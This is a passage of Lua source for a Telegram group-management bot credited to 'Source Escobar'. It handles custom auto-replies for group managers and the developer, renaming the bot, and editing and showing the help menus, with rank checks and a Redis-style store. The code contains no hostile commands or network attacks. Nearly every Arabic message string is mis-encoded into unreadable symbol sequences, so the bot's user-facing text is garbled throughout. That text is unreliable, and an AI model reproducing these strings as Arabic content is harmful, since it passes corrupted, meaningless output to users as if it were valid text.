Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΨ±Ψ― Ψ³ΩΨ§Ψ‘ ΩΨ§Ω β β₯‘\nβ¨ ΩΩΩ β’ ΩΩΨ΅Ω β’ ΩΨͺΨ­Ψ±ΩΩ β’ Ψ΅ΩΨ±Ω\n β’ ΩΩΩΩ°Ψ―ΩΩ β’ Ψ¨Ψ΅ΩΩ β’ Ψ΅ΩΨͺ β’ Ψ±Ψ³Ψ§ΩΩ β©\nβ β« ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΩ Ψ§ΩΩΨ΅ β β₯‘\nββββ EB ββββ\n `#username` β¬ ΩΨΉΨ±Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#msgs` β¬ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω\n `#name` β¬ Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#id` β¬ Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#stast` β¬ Ψ±ΨͺΨ¨Ψ© Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#edit` β¬ ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ\nββββ EB ββββ\nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ )\n β" ,  1, "md")
Devmfm:set(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'','SaveGpRed')
Devmfm:set(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'',text)
Devmfm:sadd(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'',text)
Devmfm:set(mustafa..'DelManagerRep'..msg.chat_id_..'',text)
return false
end
end
--     Source Escobar     --
if text == 'Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω' and SecondSudo(msg) or text == 'β Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω β' and SecondSudo(msg) or text == 'ΩΨ³Ψ­ Ψ±Ψ― ΨΉΨ§Ω' and SecondSudo(msg) then
Devmfm:set(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ­Ψ³ΩΨ§ Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΩΩΩΩ ΩΨ­Ψ°ΩΩΨ§ " ,  1, "md")
return false
end
if text == 'Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω' and SecondSudo(msg) or text == 'β Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω β' and SecondSudo(msg) then
Devmfm:set(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ­Ψ³ΩΨ§ Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetAllRed = Devmfm:get(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΨ±Ψ― Ψ³ΩΨ§Ψ‘ ΩΨ§Ω β β₯‘\nβ¨ ΩΩΩ β’ ΩΩΨ΅Ω β’ ΩΨͺΨ­Ψ±ΩΩ β’ Ψ΅ΩΨ±Ω\n β’ ΩΩΩΩ°Ψ―ΩΩ β’ Ψ¨Ψ΅ΩΩ β’ Ψ΅ΩΨͺ β’ Ψ±Ψ³Ψ§ΩΩ β©\nβ β« ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΩ Ψ§ΩΩΨ΅ β β₯‘\nββββ EB ββββ\n `#username` β¬ ΩΨΉΨ±Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#msgs` β¬ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω\n `#name` β¬ Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#id` β¬ Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#stast` β¬ Ψ±ΨͺΨ¨Ψ© Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n `#edit` β¬ ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ\nββββ EB ββββ\nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ )\n β" ,  1, "md")
Devmfm:set(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
Devmfm:set(mustafa.."mfm:Add:AllText"..msg.sender_user_id_, text)
Devmfm:sadd(mustafa.."mfm:Sudo:AllRed",text)
Devmfm:set(mustafa.."DelSudoRep",text)
return false 
end end
--     Source Escobar     --
if text == 'Ψ§ΩΨ±Ψ―ΩΨ―' and Manager(msg) and ChCheck(msg) or text == 'Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±' and Manager(msg) and ChCheck(msg) then
local redod = Devmfm:smembers(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'')
MsgRep = '*β β« Ψ±Ψ―ΩΨ― Ψ§ΩΩΩΪΩΩ°ΰ’ͺ β β₯‘ *\nββββ EB ββββ\n'
for k,v in pairs(redod) do
if Devmfm:get(mustafa.."mfm:Gif:GpRed"..v..msg.chat_id_) then
dp = 'ΩΨͺΨ­Ψ±ΩΩ π­'
elseif Devmfm:get(mustafa.."mfm:Voice:GpRed"..v..msg.chat_id_) then
dp = 'Ψ¨Ψ΅ΩΩ π'
elseif Devmfm:get(mustafa.."mfm:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ΩΩΨ΅Ω π'
elseif Devmfm:get(mustafa.."mfm:Text:GpRed"..v..msg.chat_id_) then
dp = 'Ψ±Ψ³Ψ§ΩΩ β'
elseif Devmfm:get(mustafa.."mfm:Photo:GpRed"..v..msg.chat_id_) then
dp = 'Ψ΅ΩΨ±Ω π'
elseif Devmfm:get(mustafa.."mfm:Video:GpRed"..v..msg.chat_id_) then
dp = 'ΩΩΩΩ°Ψ―ΩΩ π½'
elseif Devmfm:get(mustafa.."mfm:File:GpRed"..v..msg.chat_id_) then
dp = 'ΩΩΩ π'
elseif Devmfm:get(mustafa.."mfm:Audio:GpRed"..v..msg.chat_id_) then
dp = 'Ψ§ΨΊΩΩΩ πΆ'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) β {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '*β β« ΩΨ§ ΨͺΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ*'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
--     Source Escobar     --
if text == 'Ψ­Ψ°Ω Ψ§ΩΨ±Ψ―ΩΨ―' and Manager(msg) and ChCheck(msg) or text == 'ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ―' and Manager(msg) and ChCheck(msg) or text == 'Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±' and Manager(msg) and ChCheck(msg) or text == 'ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±' and Manager(msg) and ChCheck(msg) then
local redod = Devmfm:smembers(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'')
if #redod == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ ΨͺΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ" ,  1, "md")
else
for k,v in pairs(redod) do
Devmfm:del(mustafa..'mfm:Gif:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Voice:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Audio:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Photo:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Stecker:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Video:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:File:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Text:GpRed'..v..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±")  
return false
end
end
--     Source Escobar     --
if  text == "Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" and SecondSudo(msg) or text == "Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§Ω" and SecondSudo(msg) or text == "Ψ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§Ω" and SecondSudo(msg) or text == "β Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§Ω β" and SecondSudo(msg) then
local redod = Devmfm:smembers(mustafa.."mfm:Sudo:AllRed")
MsgRep = 'β β« Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ± β β₯‘ \nββββ EB ββββ\n'
for k,v in pairs(redod) do
if Devmfm:get(mustafa.."mfm:Gif:AllRed"..v) then
dp = 'ΩΨͺΨ­Ψ±ΩΩ π­'
elseif Devmfm:get(mustafa.."mfm:Voice:AllRed"..v) then
dp = 'Ψ¨Ψ΅ΩΩ π'
elseif Devmfm:get(mustafa.."mfm:Stecker:AllRed"..v) then
dp = 'ΩΩΨ΅Ω π'
elseif Devmfm:get(mustafa.."mfm:Text:AllRed"..v) then
dp = 'Ψ±Ψ³Ψ§ΩΩ β'
elseif Devmfm:get(mustafa.."mfm:Photo:AllRed"..v) then
dp = 'Ψ΅ΩΨ±Ω π'
elseif Devmfm:get(mustafa.."mfm:Video:AllRed"..v) then
dp = 'ΩΩΩΩ°Ψ―ΩΩ π½'
elseif Devmfm:get(mustafa.."mfm:File:AllRed"..v) then
dp = 'ΩΩΩ π'
elseif Devmfm:get(mustafa.."mfm:Audio:AllRed"..v) then
dp = 'Ψ§ΨΊΩΩΩ πΆ'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) β {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '*β β« ΩΨ§ ΨͺΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ*'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
--     Source Escobar     --
if text == "Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" and SecondSudo(msg) or text == "Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§Ω" and SecondSudo(msg) or text == "ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±" and SecondSudo(msg) then
local redod = Devmfm:smembers(mustafa.."mfm:Sudo:AllRed")
if #redod == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ ΨͺΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ" ,  1, "md")
else
for k,v in pairs(redod) do
Devmfm:del(mustafa.."mfm:Add:AllRed"..v)
Devmfm:del(mustafa.."mfm:Gif:AllRed"..v)
Devmfm:del(mustafa.."mfm:Voice:AllRed"..v)
Devmfm:del(mustafa.."mfm:Audio:AllRed"..v)
Devmfm:del(mustafa.."mfm:Photo:AllRed"..v)
Devmfm:del(mustafa.."mfm:Stecker:AllRed"..v)
Devmfm:del(mustafa.."mfm:Video:AllRed"..v)
Devmfm:del(mustafa.."mfm:File:AllRed"..v)
Devmfm:del(mustafa.."mfm:Text:AllRed"..v)
Devmfm:del(mustafa.."mfm:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±")  
return false
end
end 
--     Source Escobar     --
if text and text == "ΨͺΨΊΩΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" or text and text == "ΩΨΆΨΉ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" or text and text == "ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ§Ω" ,  1, "md") 
Devmfm:set(mustafa..'mfm:NameBot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'Ψ­Ψ°Ω Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ' or text == 'ΩΨ³Ψ­ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ' then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Devmfm:del(mustafa..'mfm:NameBot')
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end end 
--     Source Escobar     --
if text and text:match("^Ψ§Ψ³ΨͺΨΉΨ§Ψ―Ω Ψ§ΩΨ§ΩΨ§ΩΨ±$") and SecondSudo(msg) or text and text:match("^Ψ§Ψ³ΨͺΨΉΨ§Ψ―Ψ© ΩΩΨ§ΩΨ΄ Ψ§ΩΨ§ΩΨ§ΩΨ±$") and SecondSudo(msg) then
HelpList ={'mfm:Help','mfm:Help1','mfm:Help2','mfm:Help3','mfm:Help4','mfm:Help5','mfm:Help6'}
for i,Help in pairs(HelpList) do
Devmfm:del(mustafa..Help) 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§Ψ³ΨͺΨΉΨ§Ψ―Ψ© Ψ§ΩΩΩΨ§ΩΨ΄ Ψ§ΩΨ§Ψ΅ΩΩΩ" ,  1, "md") 
end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ§ΩΨ±" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ψ§ΩΨ§ΩΨ§ΩΨ±" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ψ§ΩΨ§ΩΨ§ΩΨ±) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help0'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help0'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "Ψ§ΩΨ§ΩΨ§ΩΨ±" or text == "Ψ§ΩΨ§ΩΨ±" or text == "ΩΨ³Ψ§ΨΉΨ―Ω" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΨ?Ψ΅ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ·\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β (Ω6) ΩΨΉΨ±ΨΆ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help')
local text =  [[*
β β« Ψ’ΩΩΩΩΩΨ’ Ψ¨Ω ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΩΨ’ΩΩΰ’ͺ β β₯‘ 
ββββ EB ββββ
β β« Ω1 β Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ
β β« Ω2 β Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ
β β« Ω3 β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
β β« Ω4 β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
β β« Ω5 β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ±ΩΩ
β β« Ω6 β Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]] 
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω1" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± ΩΩ‘" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ω1) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help01'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help01'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help1', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "Ω1" or text == "ΩΩ‘" or text == "Ψ§ΩΨ§ΩΨ±1" or text == "Ψ§ΩΨ§ΩΨ±Ω‘" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΨ?Ψ΅ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ·\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β (Ω6) ΩΨΉΨ±ΨΆ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help1')
local text =  [[*
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ­ΩΨ§ΩΨ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘
ββββ EB ββββ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΨͺΨ­Ψ±ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩΩΨ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ΅ΩΨ±
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩΩΩ°Ψ―ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ§ΩΩΩΨ§ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨͺΩΨ¬ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ§ΨΊΨ§ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ΅ΩΨͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ¬ΩΨ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨͺΩΨ±Ψ§Ψ±
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨͺΨΉΨ―ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩΨ§ΩΨ΄
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ―Ψ?ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩΨ§ΩΨΉ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΨ΄Ψ§Ψ±
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩΨ±
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨΉΨ±Ψ¨ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ
β β« ΩΩΩ β’ ΩΨͺΨ­ β Ψ§ΩΨͺΩΩΩΨ΄
ββββ EB ββββ
β β« Ψ§ΩΨ§ΩΨ± Ψ­ΩΨ§ΩΩ Ψ§Ψ?Ψ±Ω β β₯‘
ββββ EB ββββ
β β« ΩΩΩ β’ ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ± β β₯‘
β β« Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―
β β« Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΩΨͺΩ
β β« Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨͺΩΩΨ―
β β« Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―
β β« Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―
β β« Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω2" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± ΩΩ’" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ω2) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help21'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help21'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help2', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "Ω2" or text == "ΩΩ’" or text == "Ψ§ΩΨ§ΩΨ±2" or text == "Ψ§ΩΨ§ΩΨ±Ω’" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΨ?Ψ΅ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ·\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β (Ω6) ΩΨΉΨ±ΨΆ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help2')
local text =  [[*
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΨ’ΪΩΩΩΩΩΫ β β₯‘
ββββ EB ββββ
β β« Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψͺ
β β« ΨͺΨ§Ω ΩΩΩΩ 
β β« Ψ§ΩΨ΄Ψ§Ψ‘ Ψ±Ψ§Ψ¨Ψ·
β β« ΨΆΨΉ ΩΨ΅Ω
β β« ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·
β β« ΨΆΨΉ Ψ΅ΩΨ±Ω
β β« Ψ­Ψ°Ω Ψ§ΩΨ±Ψ§Ψ¨Ψ·
β β« Ψ­Ψ°Ω Ψ§ΩΩΨ·Ψ§ΩΩ
β β« ΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
β β« Ψ·Ψ±Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
β β« ΨͺΩΨΈΩΩ + Ψ§ΩΨΉΨ―Ψ―
β β« ΨͺΩΨΈΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ
β β« ΩΩΩΩΩ + Ψ§ΩΩΩΩΩ
β β« Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ + Ψ§ΩΨ§ΩΨ±
β β« ΨΆΨΉ β’ Ψ­Ψ°Ω β ΨͺΨ±Ψ­ΩΨ¨
β β« ΨΆΨΉ β’ Ψ­Ψ°Ω β ΩΩΨ§ΩΩΩ
β β« Ψ§ΨΆΩ β’ Ψ­Ψ°Ω β Ψ΅ΩΨ§Ψ­ΩΩ
β β« Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ β’ Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
ββββ EB ββββ
β β« ΨΆΨΉ Ψ³Ψ¨Ψ§Ω + Ψ§ΩΨΉΨ―Ψ―
β β« ΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± + Ψ§ΩΨΉΨ―Ψ―
ββββ EB ββββ
β β« Ψ±ΩΨΉ ΩΩΩΨ² β’ ΨͺΩΨ²ΩΩ ΩΩΩΨ²
β β« Ψ§ΩΩΩΩΨ²ΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΩΩΩΨ²ΩΩ
β β« ΩΨ΄Ω Ψ§ΩΩΩΩΨ― β’ Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ―
ββββ EB ββββ
β β« Ψ­Ψ°Ω β’ ΩΨ³Ψ­ + Ψ¨Ψ§ΩΨ±Ψ―
β β« ΩΩΨΉ β’ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ
